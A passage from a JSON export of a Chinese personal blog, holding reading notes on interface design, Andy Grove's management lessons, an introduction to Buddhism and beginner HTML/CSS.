皮肤和主题：提供开放的外观和视觉架构，让第三方可以定制图像风格；使用场景：界面的认识要求不高，非高度压力环境；使用原因：让用户参与设计创建会使其对网站更有拥有感；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"一目了然","slug":"一目了然","date":"2015-08-02T08:48:00.000Z","updated":"2024-09-22T23:08:43.601Z","comments":true,"path":"2015/08/02/一目了然/","permalink":"http://example.com/2015/08/02/%E4%B8%80%E7%9B%AE%E4%BA%86%E7%84%B6/","excerpt":"","text":"一、显性设计的定义 好的设计源于对产品目标的理解：做什么、不做什么、先做什么； Web分为三层：人、界面、数据； 显性设计的目标：迅速理解、快速完成、避免打断、然后离开； 用户的期待：敏捷、有效、自由、被尊重； 只提供用户所需的功能（够用就好）； 出错易于恢复； 二、首先搞清楚为什么开发软件，再确定软件应该构建什么内容 了解你的动机； 做出正确的决定：检查用户体验（认知走查的方式进行严格盘点；用户体验评估；竞品分析）、确定公司愿景、计划新的设计、实现、测试、迭代；拥有愿景； 三、忽略用户，了解情境 解决情境中的问题（观察、情境融入）； 理解用户如何思考事情（说的跟做的可能不同）； 理解用户在实际中如何做事情（只会用到20%的功能、只会用一种操作模式并且坚持、养成自己对软件工作原理的理解）； 找到真相（现场调查）； 撰写用例（我更喜欢以原型为主，用例说明为辅，毕竟文字非常抽象）；（我突然明白此处作者所说的用例，可能是指情景故事，或许也可以采用故事板） 四、够用就好 功能越多，挫折越大； 做移动版本； 去掉一般性功能； 3个问题：完成此功能支持的任务还有其他方式没？该功能可以直接有助于任务的完成吗？对于软件所支持的活动来说，这个功能很重要吗？（只要有一个否，去掉该功能）；（闭上眼睛思考：我的软件主要是用来支持什么情境的？记得不忘初心）； 60秒期限：开发周期缩短一半，用60秒决定哪些保留哪些舍弃（列出功能清单，60秒内砍掉不重要的功能，然后把它们放到保险柜里）； 少即是多（二八定律）；将功能减少到如果再少一项，软件就无法正常完成任务了； 五、支持用户的心智模型 为用户心智模型而设计；（例如拟物的隐喻） 摒弃开发的实现模型； 原型设计与测试；（方法：缺失浏览器测试-用来检验网站架构、5秒钟测试-用来检验第一印象、访谈测试-深入了解、吃狗食-用来发现问题）； 六、让菜鸟即刻上路 快速上路的演示； 指导性暗示； 用户期待每一次动作后的反馈； 选择合适的默认值；（如果可以的话，在应用中进行设置更加直观，用户可以看到设置所带来的变化）； 帮助文本适用于专家用户； 七、说服用户 解决有意义的问题；（意思有些问题是没有意义的，注意发现这些问题，不是所有问题都值得花时间精力去解决，或者不是由我们来解决） 具有一句简短话语的解释性； 用户的心理：互惠原则、承诺与一致性、社会认同、权威性认同、偏好、稀缺性（这六点是影响力一书的要义）； 八、巧妙应对出错 利用Poka-yoke防止和修复错误；（预防型和检查型） 优化出错提示；（内联验证、给出解决办法、让用户感到聪明） 摒弃模式化；（例如用“撤销”来替代删除确认） 设计宽容的软件；（例如不要让用户丢失录入的数据） 九、一致性设计 50毫秒即可形成第一印象、500毫秒即可看清大致内容，所以看脸很重要；（包括一致性、视觉层次、比例、对齐、排版、空间记忆） 理解设计模式、阅读设计模式库（保证在多个页面或者多个软件之间持续一致的用户体验）； 平衡无规则性（一般为了使某件东西显得突出，包括使用颜色、尺寸）； 十、精简与优化 消除混乱（包括不断精简、留白、清理任务流程）； 5S法，包括分类（决定保留、储备或舍弃）、理顺（排序）、擦亮（保持清爽）、标准化（保持一致性）、持续； 十一、改良比创新重要 持续改进提升用户体验，即使它是很小的问题； 让软件友好一些，像与朋友在交流一样； 向好的样例看齐； 分清主次，尝试去掉次要功能；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"格鲁夫给经理人的第一课","slug":"格鲁夫给经理人的第一课","date":"2015-07-13T13:16:00.000Z","updated":"2024-09-22T23:10:06.076Z","comments":true,"path":"2015/07/13/格鲁夫给经理人的第一课/","permalink":"http://example.com/2015/07/13/%E6%A0%BC%E9%B2%81%E5%A4%AB%E7%BB%99%E7%BB%8F%E7%90%86%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E8%AF%BE/","excerpt":"","text":"1. 早餐店的生产线 什么是生产：预定的时间、可接受的品质、最低的成本、依照客户需求，交付产品（或者服务）； 有哪些生产步骤：制造、组装、测试；（在软件行业，则是分析、设计、构建、集成、测试） 什么是限制步骤：整个生产过程中，需时最长（或最困难、最敏感、最昂贵）的步骤；(构建需要花的时间最久，所以优先考虑用敏捷开发的模式，小周期，快速迭代调整，验证获取信息，修正重新构建） 根据现有资源，如何找出最佳策略：了解生产过程中的每一个步骤及其互动关系，了解各方案的利弊得失；（调研和设计先行，构建使用敏捷，测试集成到开发中） 测试与验货；及早发现，及早解决；发现的越早，解决的成本越低；（测试要提早到开发的每一个单元中，越早进行越好） 如何设定衡量指标，确保业务有在正常运转？我们关心的事情有哪些？从此处入手；（快速迭代，找用户验证） 关于指标的两个原则：有总比没有好（衡量结果，不衡量过程）；衡量具体且可计算的事情；（估算的准确率、速率）（可用性测试，测试通过的指标是什么） 指标配对：避免过度反应，在不同取向的指标中取得平衡，找到最佳方案； 指标的3个好处：1、清楚列出了目标；2、为评价考核提供客观性；3、为不同组织相同工作提供比较的可能性； 黑箱理论：将生产活动视为黑箱&#x3D;投入+产出+人力； 几种指标：先行指标（了解未来、引导现在）、线性指标（例如燃尽图）、趋势指标（同比、环比）、重复印证表； 品质保证：关卡式、监视器式、随机式； 产能&#x3D;全部产出&#x2F;投入人力；提高产能的3个办法：1、加速生产；2、改变工作本质（该做什么）；3、提高杠杆率； 提高杠杆率办法：自动化、简化工作步骤； 2. 打好团体战 经理人的产出&#x3D;他直接管辖部门的产出+他间接影响所及部门的产出； 书面报告的作用：用来对自己的问题或方案进行更严格的审视，即它的自律性大于信息传递作用； 一个极有效的收集信息的办法：多在公司内走动； 经理人的产出计算公式&#x3D;活动AA的杠杆率+活动BB的杠杆率……以此类推，所以最重要的一件事情是，找出杠杆率最高的2-3项活动，一心一意去做； 授权的必要条件：授权人与被授权人有相同的信息基础，且二者对开展工作和解决问题有彼此认同的方法； 没有完备的监督计划的授权等于渎职；监督不是干涉，而是不时的检查来确定活动的进行一如预期； 监督的节奏，在工作成熟度最低的时候，在活动早期及时进行监督；当成熟度上升，减少监督的频率； 提高工作速度的方法： 找出限制步骤（列出非做不可的事）； 类似的工作集中在一起做； 安排好日程表，在非做不可的事情中，安排穿插一些”很重要但时间有弹性的事”来做； 学会拒绝超过工作负荷的事； 建立指标，预估事项的完成时间； 储备存货：一些不急着完成的项目； 标准化； 部属人数：如果“带人”是主要职责，那么6~8个，确保每个部属可以分配到足够的时间；（那如果不是以带人为主要职责呢？） 应对干扰和突发情况：1、将不规律的事情规律化，即制定处理手册的东西；2、划分固定的时间来处理，其他时间不接单； 开会：过程导向会（知识技能和信息的交流）；任务导向会（为解决某个问题）；前者通过规律化提高会议效率，比如一对一会议（互通信息以及彼此学习）； 1对1会议：频率（新手一周一次，熟手一月一次）；时间（长到足够提出棘手问题）；部署主持（准备会议纲要）；要点：由部署提出潜在问题，上司扮演协调者的角色，让部署畅言；技巧：上司要写下来部署的问题；同时建立存档，将一些重要不紧急的事项列下来留待下次讨论，分批处理； 部门会议：涉及2人以上的工作事项，在部门会议中讨论；上司可以通过此会议，比1对1会议更加了解事情的真相本质；上司在会议中扮演协调者的角色，确保不跑题、控制进度、化解纷争； 运营总结会议：让由于组织关系，没有参加1对1和部门会议的人员之间，可以有机会彼此学习和分享经验；会议由提案人上司来召集并指导提案人讲演节奏；由总结负责人来带动自由讨论；由提案人在讲解；由其他人发表意见和提出疑问；（作用：讨论提案，学习经验） 任务导向会议： 会议主席在会前必须弄清楚哪些决策需要在会上进行制定，通过开会想得到什么，有没有其他不开会的办法，如果有则不要开； 决定开会后，确定出席人并确保参加，如果不能参加，请他找个能代表他说话的人来； 与会人员不超过6~7个，不然有点推不动； 确保每个参会人在会前拿到议程，知道会议目的以及每个人要扮演的角色； 会后通过发送会议记录确定决策的内容；会议记录越快发出越好，并尽可能详细，让看的人知道有什么事该做、谁负责去做以及什么时候做； 决策：对于以信息和科技为主导的公司，决策应该让离问题越近，最了解问题的人来制定；（那非信息和科技主导的公司呢？比如哪些公司？手工制造业？服务业？农业？我觉得可能是那种主要以执行为主的行业，不可预测性较少，不需要前线的人员随机应变；比如说钢铁厂、粮食加工行业，大型原材料制作业） 理想决策过程的三阶段： 自由讨论； 清楚的决策； 全力支持； 务必注意一点：决策内容的制定和执行应该交给最低层级； 注意同级群体综合证，注意加一个更高职位的人，来引导讨论不偏题； 制定决策前应了然的6个问题： 决策内容 决策时限：如果不限定时限，有可能会导致问题被无限期拖延；因为很多人害怕承担责任； 决策人 制定决策前应向谁咨询 谁是决策终结者：决策终结者可以考虑在决策过程中不参与决定制定，只是倾听和提出疑问，最后的时刻，才出来发表意见； 谁应该在决策后被告知； 规划：做规划的目的相当于一种未雨绸缪，而不是等问题来了才临时应变； 预测需求（界定外部因素，现在与未来）；（设想未来的场景，提前为这个场景的到来做准备） 分析现状（定义目前的状况）； 缩小差距（决定要采取哪些办法，需要做些什么，自己能做什么）； 规划的产出：一套行动方案（注意，不是定出目标而已，这个需要非常明确） 什么事情今天做了，明天会更好，或至少不变坏； 规划可能达5年，但实际的行动方案是接下来的1年，因为等下一步再做规划的时候，会修改后续的行动方案； 规划的人应该是负责执行的人； 目标管理：（目标通常是短期的）（因为太长期的目标由于诸多不可预测性，可能需要经常变更，导致失去意义） 我想去哪里？（答案即目标）； 我如何知道正朝着目标迈进？（沿途应验收的成果；验收应依据经理人的才智经验来判断；） 3. 推动组织的巧手 任务导向型组织（优点：能快速响应市场需求；缺点：成本高）；（或许可以通过阿米巴方式来解决） 功能导向型组织（优点：能发挥规模效应，成本低；缺点：跨部门协调导致决策响应慢）； 混血型组织（优缺点折中）； 双重报告：既满足快速响应需求的需要，又能发挥规模效应； 人的行为受３种因素影响：自由市场因素；契约关系；文化价值观；（同一个人在不同阶段中的主导因素可能不同）； 4. 谋事在人 激励部属参加比赛；马斯洛的需求模型；创造讲究产出的环境；制定游戏规则，让员工有衡量表现的尺度；求胜但不怕输，并随时向自己的极限挑战；（如果想象不出来游戏规则，或许可以组织大家头脑风暴，来共同设计游戏规划） 管理风格取决于工作成熟度： 低：告诉该做什么、如何着手、什么时候完成； 中：沟通、情绪上的支持与鼓励为主； 高：参与程度低，建立起工作目标及监督系统； 无论哪个阶段，都应随时且适度的检查部属的工作，以避免出现突发状况； 绩效评估： 检视部属的技能水准（看看哪些技能缺乏有待提高）； 加强激励的力度（让其创造出更高的绩效）； 绩效评估考虑： 产出评估（应对现在）与流程评估（应付未来）； 长期绩效和短期绩效（将长期绩效折现）； 产出与时间的关系； 个人与部门兼顾（评估经理人适用）； 避免潜力陷阱（只评估绩效而非潜力）； 告知评估结果：坦诚、倾听、忘了自己；只谈最重要的4点（多了吸收不了）；提前告知评估结果，之后双方再1对1讨论；花更多时间在评估优秀的员工上面（他们更值得投入更多的时间）； 招人： 80%的时间让对方讲自己关心的话题； 收集信息：专业知识如何、应用知识的能力； 询问假设性的问题； 让面试者提问； 与推荐人谈一谈； 留人：如果一名极具价值的员工提出辞职，以第一时间推掉所有事情，并倾听他的想法；给予尊重和肯定，即使需要将其推荐到其他部门； 报酬要明显的反映绩效； 对金钱敏感的人员（如中低层员工），绩效奖金在报酬中的比例应为偏小； 对金钱不敏感的人，绩效奖金在报酬中的比例应越大； 分清楚考核的是个人绩效还是团队绩效； 注意绩效奖金发放的时间尽量接近工作完成之时（以便员工记得为何受到奖励）； 除非我们能在部属之间分出高下，根据表现或是折中的薪资制度才能够运作；（如果我们分不出高下，那么我们无法根据他们的表现给予客观评估，这样会让人感觉不公平） 升迁：考虑多个维度，管理维度和技术维度；如果升迁后无法胜任，则不要怕再回收； 绩效考核：公平、公正、公开； 培训：经理人应该扛起培训的责任；因为：部门产出即经理人的产出； 培训的持续性： 即有系统、有计划；一直进行，而非单一事件； 培训应与公司实务相结合； 培训由足以成为员工楷模的人员来担任（讲课的人需要有可信度与权威性）； 两类培训： 新进员工需要掌握的知识和技能； 现有员工需要掌握的新知识和新技能； 培训课程的设置： 可以问问员工他们需要学一些什么； 优先级：先为最紧要的项目设计短期培训课程（3-4堂课）； 第一堂课通常不太成功，可以先给有经验的人试讲，收集反馈改进课程设计； 如果课程需要覆盖的人很多，可以考虑培训出几个讲师代劳； 上完课后请用上课的学员提出匿名批评； 5. 期末考 询问自己以下的问题 试着将你工作中的操作分为编制流程、组装及测试三个步骤；（我觉得这里说的操作是指操作人员的实务操作，不是经理人员的操作；这样就比较好理解了，比如调研的流程、设计的流程、测试的流程等，这些工作都可以设计工作流程；） 调研的流程 确定调研的目的； 选择调研的方法； 调研前的工具、资料、人员准备； 执行调研，收集信息； 分析数据，得到调研结论，出具调研报告； 设计的流程 战略层：确认目标 公司的目的； 用户的目的； 范围层：确认要做什么，不做什么，先做什么； 结构层：如何安排交互，让用户完成他的任务目标； 框架层：如何排版布局，设计界面，让用户一目了然； 表现层：如何加强用户的视觉感知，辅助其完成任务； 测试的流程 测试的原型、人员、资料准备； 执行测试，收集信息； 分析信息，得出结论和建议； 针对你手头开展的方案，找出限制步骤，并依此设计你的工作流程；（限制步骤一般指那个耗时最长、或成本最高的步骤，一般工作流程要围绕它进行优化，包括找了依赖关系，安排并行事项等） 找出你工作中最适合进行验货、线上检验与最终检验的地方；决定这些检验应该采用关卡还是监视器的方式；然后考虑在什么时机下，你可以升格至“随机检验”；（限制步骤开始前，最好确认一下前期工作是否都准备好，以及相关人员对限制步骤的开展是否具备知识和技能；最后再安排检查结果）（至于是关卡还是监视器或随机检验，取决于成员的工作成熟度；如果成熟度低，则每个流程步骤都需要进行验收，甚至在每个步骤前告知应做什么，怎么样，何时完成；） 找出至少6项的新产出指标；这些指标应该要能衡量产出的质与量；（质与量的目的是什么？是为了最后的按时按质按需求最低成本交付，所以指标包括：完成时间、完成质量、需求匹配程度、成本；如果再细分，每一项需要怎么分？完成时间&#x3D;预算耗时+实际耗时；质量&#x3D;数据完整+逻辑严谨+条理清晰+结论有力；需求匹配&#x3D;用户净推荐率+相对价值法（让用户列出工作中感觉好用的软件，打基准分；之后再给本软件打相对分；或许可考虑让用户匿名打分投票）；成本&#x3D;消耗的时间+投入的人员+其他直接费用；）（指标更多只是为了观察工作是否顺利进行，不列入绩效考核，考核因为以交付客户价值来衡量比较准确有力） 将这些新的指标变成工作上的例行事项，并在部门会议中定期审视； 你现在正寻找的最重要的战略（行动计划）是什么？描述你面临的环境需求以及计划进度。如果计划能成功执行，是否能将你或你的公司带到理想中的境界？（我理想中的境界是什么？提出有价值的方案，获得客户的订单，带来收入，创建利润；所以我的计划应该包括寻找有价值的解决方案、向客户展示价值、按时按质依需求最低成本交付） 简化你最烦琐、最耗时的工作。至少让原有的步骤减少30%； 找出什么是你真正的产出？你所管理的部门及影响力所及的部门产出元素为何？按重要顺序排列； 实际在公司中走动走动；然后，列出这次“出巡”中和你有关的事项； 找一些借口让你一个月可以在公司内巡视一次； 描述下一次你授权给部属时会如何督导；你将以什么为标准；怎么做；督导的频率是怎样的； 列出你可以利用零碎的时间进行的项目； 列出和每一个部属1对1会议的时间表（在会议之前向他们解释会议的目的，并要求他们做准备）；（会议的目的是由其反馈问题，以便发现情况，及协调指导） 找出你上星期的日程表，将做的活动分为高、中、低杠杆率三类；设法多做一些高杠杆率的活动；（有哪些活动该减少或干脆不做；） 预测下周有哪些事要瓜分你的时间；有多少时间要花在开会上？其中有多少是过程导向会议？多少是任务导向会议？如果后者占据的时间超过25%，你该如何设法删减？（任务导向会议应如何删减？） 列出你的组织在未来三个月中最重要的三个目标，并一路验收成果； 在与部属充分讨论过以上目标后，要他们也“依葫芦画瓢”-制定他们的目标并一路验收； 写出“悬而未决”需作决策的事项；找出其中三项，试着运用决策制定过程的架构以及“六点问题”的方法；（决策内容、决策时限、决策人、谁应该在决策前被咨询、谁是决策终结者、谁应该在决策后被告知） 依据马斯洛的需求理论评估你自己的需求层次；并为部属找出他们所属的层次； 给部属勾画他们的跑道，并找出每一个人的绩效指标； 列出你给部属各种形式的工作所给予的相关回馈；他们是否能借着这些回馈来测量自己的进度； 将你部属的工作成熟度分低、中、高三类；并针对个人选出最适当的管理风格并在你的管理风格及最适当的管理风格之间作比较； 评估你上一次收到的或你对部属所作的绩效报告，这些报告对提高绩效有多大的影响；在上司告诉你报告内容或你告诉部属时，你们的沟通形式是怎样的； 如果有哪一份报告不够理想，重做；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"佛学概论","slug":"佛学概论","date":"2015-06-06T04:08:00.000Z","updated":"2024-09-22T23:09:57.786Z","comments":true,"path":"2015/06/06/佛学概论/","permalink":"http://example.com/2015/06/06/%E4%BD%9B%E5%AD%A6%E6%A6%82%E8%AE%BA/","excerpt":"","text":"第1章 佛教与象 佛学经历了上千年的发展，由非常多的人贡献了非常多的智慧，所以它本身非常博大精深，涉及到了哲学、生活智慧、伦理制度、宗教等各领域； 目前对佛学的研究还没有一个统一的定论，可以用类似盲人摸象来进行类比，出于我们的文化背景局限性，每个人出于自身经验对佛学的一部分进行理解和推断，有些人摸到了象鼻，有些人摸到了象脚，其他人摸到了象尾、象耳、象牙，不一而足； 因为佛学流派众多，所以我们务必谨慎在不了解其他更多看法前，盲目的将自己所掌握的推论及整个佛学； 多数佛学观点没有创造世界的神，即世界不是由类似上帝的角色创造的，但它承认一些超自然的存在； 第2章 佛学与宗教 宗教7维： 实用性与形式性：有仪式，但更多是关于僧家内事，僧众非神人间的中介，无超自然的能力和权威；部分部派由于当地风俗习惯、传统文化影响、俗家信众要求等，有发展出一些仪典，以便与其他宗教提供的类似服务相匹敌； 经验性与情感性：佛陀强调体验的重要性，并宣示其经验是一切教义的根源，所有教诫如未经个人体验加予证实便毫无价值；体验之所以重要，是因为佛教将宗教实践做为一种自我转化的途径； 叙述性与神话性：我个人倾向于将这部分内容更多的看做是一种寓言，一种传播佛法时所使用的让人更加易懂的工具； 教条化与哲学性：以智慧和条理的方式系统表达的宗教性教诲和训诫；佛教的核心教义由创始者归纳成一套互相关联的基本原理；有人负责研究阐述澄清，有人负责著书印制经文；另外也有人认为通过体验（如禅定），相比研读经书，更容易通往证悟； 伦理性和律法性：核心为“不害”的原则，反对暴力，倡导和平； 社会性和组织性：社会的核心是佛陀创立的僧伽制度；佛教并非为僧尼而设，而是强调僧尼与俗众之间的相互包容和依赖性，早期佛教世界存在着明确的僧俗界限，但现代佛教正竭力消除两者之间的分隔；佛教无统一的领袖首脑，佛陀倾向于信众之间是一种共和的亲密合作； 物质性：如庙宇、画像、雕塑、圣地、经文等 第3章 佛陀 出生：出生在今天的尼泊尔境内，其族人以“释迦”自称，“牟尼”表示圣人的意思，即“释迦族的圣人”；佛陀非名字，而是“觉者”的意思；本人名：悉达多-乔达摩；约出生在公元前566年至486年左右，死在公元前410元左右； 经藏：佛陀的训诫记录在经藏中，称为“正典”；口口相传和集体记诵是当时保存经典的常用方式；唯一保存完好的早期佛经是巴利文正典（当时的一种类似梵文的方言，接近佛陀使用的语言），约公元前1世纪中期所写，分为三部分或称“三藏”，即经藏（佛的说法，又可细分为五部）、律藏（清规训诫的结集）和论藏（结集而成的佛学论著）；早期经文关于佛陀的生平事迹很少，后来陆续补充，增加了很多想象的细节； 生平：资料不全，所以没有完整的生平；大约有四个重要事件，即降生、证悟得道、法轮初转和涅槃圆寂； 四相：生、老、病、死；佛陀见到这些现象后进行思考，开始寻找解决方案； 苦修：找了2个老师，练习禅定，但发现无法最终解决问题； 证悟：开始取‘中道“，按自己的方法修习，终于进步很快，得到证悟；考虑后，决定传播教义； 法轮初转：传播效果很快，很多人得到了证悟，信众越来越多； 圆寂：老了，走不动了。圆寂前做了2件事，一、确定无领袖；二、要求信众仔细研读教义并加予证实后再决定是否遵从；导致佛教没有统一的经藏传世，也无机构负责统一发放经律； 第4章 业与轮回 业与轮回：轮回的观点非佛教首创，印度原已经有了；其特点在于与业的结合，即转世来生由当世的所做所为所决定； 佛家世界：由物界和众生组成；人的欲念可能是苦难的根源； 六道轮回：早期是5道，后来增加了阿修罗道；可类比为31层的大楼； 三界：大体同六道，欲界、色界、无色界，有点符合禅定理论； 业：一种类似万有引力的自然律； 行：做一事成一习，以一习成一性，以一性成一命； 善或恶：心理动机，三不善：贪婪、憎恨、欲念；三善：无执、慈悲、慧解； 功德：善的业； 转生（轮回）并非解脱苦难的方法，只有涅槃才是最后的解脱之途； 第5章 四圣谛 一切皆苦；苦源于欲望；一切苦皆可得解脱；存在着一条解脱苦难的途径；如果佛陀是名医生，他的说法大致可为：判断病名；解释病因，判断病症可治，最后着手治疗； 苦谛、集谛、灭谛、道谛； 第6章 几个重要的概念： 什么是佛；（佛只是证悟后的一种状态，是修行达到一定水平后的一种境界；不存在住在某个类似天国或者极乐世界，以及里面不存在类似神一样人格的永恒存在） 有没有神；（没有神，关于菩萨与神话故事都是后来人的想象，主要是为解释道理用的寓言） 什么是轮回；（分为物质的轮回和精神的轮回，前者即物质组成生命，生命死后还原成物质；后者指人在贪瞋痴中的苦的轮回，时时刻刻都在发生；） 什么是证悟；(证悟是指善与智慧的习得到达一定水平后，脱离苦的轮回，看清事物本质，类似游泳学会了换气） 什么是修习；为什么要修习；如何修习；（修习是指不断习得善与智慧；原因：开始只是为了证悟，证悟之后是为了更加自在，就像学会游泳后，仍然继续练习一样，是为了更加精进；修习方法：通过研读书籍，实践体验，禅定冥想；） 如何才能证悟；（习得慈悲心，习得智慧，看破贪瞋痴，看清事物本质） 什么是涅槃；（证悟时是第一次涅槃，死亡时是第二次涅槃；第二次涅槃后精神归于寂灭，肉体回归物质） 什么是法；（法是自然规律，法先于佛而存在，佛陀只是发现了法，而非创造了法；并且法的发现是一个倒金字塔的过程，佛陀先发现了一小部分，随着推移，后世的人不断加入并发现更多，终于由一颗种子长成了一棵枝繁叶茂的大树）； 如何看待教义；（教义是佛陀的一些修习指导，在修习的不同阶段进行遵守，而不是一开始就盲目全盘接受；没有经过个人体验证实的教义，都是没有价值的；只有真正领悟了才具备价值；）","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"哲学","slug":"哲学","permalink":"http://example.com/tags/%E5%93%B2%E5%AD%A6/"}]},{"title":"Headfirst HTML&CSS","slug":"Headfirst HTML&CSS","date":"2015-05-26T13:49:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2015/05/26/Headfirst HTML&CSS/","permalink":"http://example.com/2015/05/26/Headfirst%20HTML&CSS/","excerpt":"","text":"第一章 认识HTML Web服务器存储并提供由HTML和CSS创建的网页，浏览器获取页面，并根据HTML和CSS显示网页的内容； HTML用来建立网页的结构，CSS用来控制HTML的表现； 通过HTML，我们利用标记来标示内容提供结构。我们把匹配标记以及它们包围的内容称为元素； 元素由3部分组成：一个开始标记、内容和一个结束标记。不过有些元素有所例外； 开始标记有可以有属性； 结束标记在左尖括号后面、标记名前面有一个”&#x2F;“，以明确这是结束标记； 所有页面都要有一个html元素，其中要有一个,head元素和一个body元素； 大多数空白符（制表符、空格、回车）会被浏览器忽略，不过可以利用空白符让代码更有可读性； 可以在style元素中写CSS规则，为HTML网页增加CSS；style元素总要放在head元素里； 可以使用CSS在HTML中指定元素的特性； 第二章 了解超文本 想从一个页面链接到另外一个页面，使用a元素；a元素的href属性指定了链接的目标文件； a元素的内容就是链接的标签；这个标签就是你在网页上看到的链接文本；这个标签默认会有下划线，指示这是可以点击的； 文字或图像都可以用作链接的标签； 单击一个链接时，浏览器会加载href属性中指定的Web页面；可以链接到相同文件夹中的文件，也可以链接到其他文件夹中的文件； 相对路径是相对于链接的源Web页面指向网站中其他文件的一个链接；就像在地图上一样，终点总是相对于起点； 使用“..”可以链接到源文件上一层文件夹中的一个文件； “..”表示“父文件夹”； 记住要用”&#x2F;“字符分隔路径中的各个部分； 指向一个图像的路径不正确时，会在Web页面上看到一个损坏的图像； 为网站选择的文件名和文件夹名中不要使用空格； 最好在构建网站初期组织网站文件，这样就不用在网站升级时修改一大堆的路径； 第三章 构建模块 开始输入内容之前要规划好Web页面的结构。首先画出一个草图，然后创建一个略图，最后再写出HTML； 规划页面时，首先设计大的元素，然后用内联元素完善；记住，要尽可能使用元素来告诉浏览器的内容的含义； 一定要使用与内容含义最接近的元素； p, blockquote, ol, ul, li都是是块元素；它们单独显示，在内容前后默认分别有一个换行； q, em是内联元素，这些元素中的内容与其包含元素的其余内容放在一起； 需要插入你自己的换行时，可以使用元素；是一个void元素；void元素没有内容，只有一个标记组成；空元素没有内容，不过它有开始和结束标记； 嵌套元素是指完全包含在另一个元素中的元素；如果元素能正确地嵌套，所有标记都能正确匹配； 要结合两个元素建立一个HTML列表：使用ol和li建立有序列表，使用ul和li可以建立一个无序列表； 浏览器显示一个有序列表时，它会为列表创建序号，所以无需再费心； 可以在列表中建立嵌套，将ol或ul元素放在li元素中； 要对HTML内容中的特殊字符使用字符实体； 第四章 连接起来 要把网站发布到Web上，通常最好的办法就是找一家托管公司来托管你的Web页面； 域名是一个唯一的名字，用来唯一标识网站； 托管公司可能会为你的域创建一个或多个Web服务器；服务器通常命名为”www”； 文件传输协议FTP是向服务器传输web页面和内容的常用方法； URL是统一资源定位符或web地址，可以用来标识Web上的任何资源； 典型的URL由一个协议、一个网站名和资源的一个绝对地址组成； HTTP是一个请求和响应协议，用来在Web服务器和浏览器之间传送Web页面； 浏览器使用file协议从本地的计算机读取页面； 绝对路径是从根文件夹到一个文件的路径； “index.html”和”default.html”都是默认页面；如果指定一个目录而没有指定文件名，则Web服务器会查找一个默认页面返回浏览器； a元素的href属性中可以使用相对路径或URL链接其他Web页面；对于你的网站的其他页面，最好使用相对路径，外部链接才使用URL； 可以用id属性在页面中创建一个目标；使用#后面加一个目标id，可以链接到页面中的位置(定位)； 为了便于访问，可以在a元素中使用title属性提供链接一个描述； 使用target属性在另一个浏览器窗口中打开链接；不要忘了，对于使用各种不同设备和浏览器的用户，target属性可能会有问题；a target&#x3D;”_blank” 第五章 为页面增加图像 使用img在页面中放置图像； 浏览器对img的处理办法与其他元素不同，它会先读取整个HTML页面后，再从服务器取图像； 如果页面上有多个大图，建议创建一份小的缩略图，初次先加载缩略图，提高速度； img是一个内联元素，不会切换行； 可以用src属性指定图像位置，可以相对路径，也可以是URL； img元素中的alt属性是对图像的文字描述；无法找到图像时会显示文字替代，同时也可以方便盲人； 图像宽度要小于800像素；太大会使得加载很慢； JPEG&#x2F;PNG&#x2F;GIF，是目前3种主流格式，JPGE适合保存照片和其他复杂图像；PNG和GIF适合保存LOGO或其他包含单色、线条或文本的简单图形； JPEG可以按照不同质量压缩，可以方便权衡质量和文件大小； PNG和GIF适合创建有透明背景的图像； PNG和GIF是无损格式，因此一般都比JPEG大； PNG可以比GIF更好的透明度控制，而且不像GIF只支持256种颜色，PNG可以支持更多颜色； PNG有3种不同大小的选择，分别为PNG-24（百万级颜色）、PNG-16（千种颜色）、PNG-8（256种颜色）； Matte（蒙版）选项可以选择合适的颜色，柔化PNG或GIF图像的边缘； 图像可以做为一个链接，只需将img做为a元素的内容即可； 第六章 标准及其他 使用文档类型定义（doctype）来告诉浏览器要使用的HTML版本； head元素中的meta元素告诉浏览器关于一个Web页面的额外信息，如内容类型和字符编码； meta中的charset属性告诉浏览器所使用的字符编码；一般都使用utf-8； alt属性是img的必要属性； W3C验证工具可以免费在线检查页面是否符合标准；确保HTML合法，元素和属性符合标准； 符合标准的话，页面会更快的显示，浏览器兼容问题更小，CSS也能更好的工作； 第七章 CSS入门 CSS包含一些简单语句称为规则，每个规则为选定的HTML元素提供样式； 典型的规则包含一个选择器，以及一个或多个的属性和值； 选择器指定规则要适用到哪些元素； 每个属性声明以一个分号“;”结束；规则中的所有属性和值都放在一对{}大括号内； 可以使用元素名来做为选择器，来选择任意元素； 通过用逗号分隔元素名，可以一次选择多个元素； 要在HTML中包含一个样式，最容易的办法就是使用style标记； 对于HTML以及相当复杂的网站，可能要链接到一个外部样式表； link元素用于包含一个外部样式表； 很多元素都能继承。例如给body设置了一个可继承的属性，那么body的所有子元素都会继承这个属性； 通过为想改变的元素创建一个更特定的规则，能覆盖继承的属性； 可以使用class属性加元素增加到一个类； 通过在元素名和类名之间加一个”.”，可以选择该类中的一个特定元素； 使用“.classname”可以选择这个类的所有元素； 通过在class属性中放入多个类名，可以指定一个元素属于多个类，类名之间用空格分隔； 可以使用W3C验证工具验证CSS； 第八章 增加字体和颜色样式 CSS提供了很多属性对字体外观进行控制，包括font-family, font-weight, font-size, font-style； font-family是一组有共同特征的字体； 用于web的字体系列有serif、sans-serif、monospace、cursive、fantasy，其中前2个最常用； 页面访问都在浏览器看到什么字体，取决于他的电脑装了什么字体，除非我们使用了Web字体； 在font-family中最好指定候选字体，以免用户的电脑没有安装我们的首选字体；最后一个候选字体一般是通用的serif或sans-serif字体； 如果要使用某种字体，但默认情况下用户没有安装，可以在CSS中使用@font-face规则； 字体大小通常使用像素、em、百分数或关键字指定； 如果使用像素”px“来指定字体大小，即是告诉浏览器字母的高度是多少像素； 